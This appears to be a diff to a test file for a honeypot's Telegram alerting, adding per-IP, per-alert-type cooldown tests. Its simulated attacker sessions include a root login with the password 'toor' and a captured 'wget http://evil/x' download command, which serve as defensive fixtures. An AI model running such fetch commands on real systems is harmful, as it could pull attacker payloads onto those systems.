@@ -254,11 +254,57 @@ class TestRealtimeAlertRouting:
         assert realtime_alert.collection.count_documents({}) == 2
 
     # -----------------------------------------------------------------------
-    # AL-13: per-IP Telegram alert cooldown (added after a real IoT-botnet
-    # login loop - connect/login/run-commands/disconnect every few seconds -
-    # flooded Telegram with a fresh push every cycle)
+    # AL-13: per-(IP, alert type) Telegram alert cooldown (added after a real
+    # IoT-botnet login loop - connect/login/run-commands/disconnect every few
+    # seconds - flooded Telegram with a fresh push every cycle). Cooldown is
+    # tracked separately per alert type (login_failed/login_success/
+    # session_commands), not shared across them - a shared cooldown used to
+    # mean a login-success alert routinely swallowed the session-commands
+    # alert for the SAME session moments later (caught live in production
+    # 2026-08-06: a captured command sequence never reached Telegram because
+    # its session closed 2 minutes after a login-success alert for the same
+    # IP, well inside what used to be one shared 5-minute window).
     # -----------------------------------------------------------------------
-    def test_al13_second_alert_from_same_ip_within_cooldown_is_suppressed(
+    def test_al13_second_alert_of_the_SAME_type_from_same_ip_is_suppressed(
+        self, fresh_module, monkeypatch
+    ):
+        realtime_alert = fresh_module("realtime_alert")
+        mocks = self._mock_all_alerts(realtime_alert, monkeypatch)
+
+        realtime_alert.process_event(
+            make_login_failed_event(src_ip="203.0.113.7", username="root", password="a")
+        )
+        realtime_alert.process_event(
+            make_login_failed_event(src_ip="203.0.113.7", username="root", password="b")
+        )
+
+        mocks["alert_login_failed"].assert_called_once()
+
+    def test_al13d_login_success_does_not_suppress_session_commands_alert(
+        self, fresh_module, monkeypatch
+    ):
+        """The exact production bug: a login-success alert for an IP used to
+        'use up' the cooldown, silently swallowing the session-commands
+        alert for that SAME session when it closed moments later. Different
+        alert types now have independent cooldowns."""
+        realtime_alert = fresh_module("realtime_alert")
+        mocks = self._mock_all_alerts(realtime_alert, monkeypatch)
+
+        realtime_alert.process_event(make_connect_event(session="sessA", src_ip="203.0.113.7"))
+        realtime_alert.process_event(
+            make_login_success_event(session="sessA", src_ip="203.0.113.7", username="root", password="toor")
+        )
+        realtime_alert.process_event(
+            make_command_event(session="sessA", src_ip="203.0.113.7", command="wget http://evil/x")
+        )
+        realtime_alert.process_event(make_closed_event(session="sessA", src_ip="203.0.113.7"))
+
+        mocks["alert_login_success"].assert_called_once()
+        mocks["alert_session_commands"].assert_called_once_with(
+            "203.0.113.7", ["wget http://evil/x"]
+        )
+
+    def test_al13e_login_failed_and_login_success_have_independent_cooldowns(
         self, fresh_module, monkeypatch
     ):
         realtime_alert = fresh_module("realtime_alert")
@@ -272,7 +318,7 @@ class TestRealtimeAlertRouting:
         )
 
         mocks["alert_login_failed"].assert_called_once()
-        mocks["alert_login_success"].assert_not_called()
+        mocks["alert_login_success"].assert_called_once()
 
     def test_al13b_different_ips_have_independent_cooldowns(self, fresh_module, monkeypatch):
         realtime_alert = fresh_module("realtime_alert")
